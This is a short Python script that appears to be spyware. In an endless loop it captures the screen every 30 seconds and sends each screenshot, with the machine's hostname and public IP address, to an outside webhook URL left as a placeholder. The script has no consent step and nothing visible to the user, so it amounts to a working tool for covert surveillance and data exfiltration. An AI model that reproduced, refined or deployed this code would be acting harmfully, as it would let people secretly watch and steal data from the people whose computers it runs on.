import os
import json
import socket
import requests
import time as t
import pyautogui as autogui

# Setup
WEBHOOK = 'Webhook_URL_Here'

def get_device_name():
    return socket.gethostname()

def get_ip():
    response = requests.get('https://api.ipify.org?format=json')
    ip = response.json()['ip']
    return ip

def send_screenshot(computer, ip):
    screenshot = autogui.screenshot()
    screenshot.save('screen.png')
    embed = {
        "title": "Screen Captured",
        "description": f"**Device:** `{computer}`\n**IP Address:** `{ip}`",
        "color": 0x3498db,
        "image": {
            "url": "attachment://screen.png"
        }
    }
    payload = {
        "embeds": [embed]
    }
    with open('screen.png', 'rb') as f:
        files = {
            'file': ('screen.png', f, 'image/png'),
            'payload_json': (None, json.dumps(payload), 'application/json')
        }
        requests.post(WEBHOOK, files=files)
    os.remove('screen.png')

while True:
    device = get_device_name()
    IPv4 = get_ip()
    for i in range(300):
        send_screenshot(device, IPv4)
        t.sleep(30)
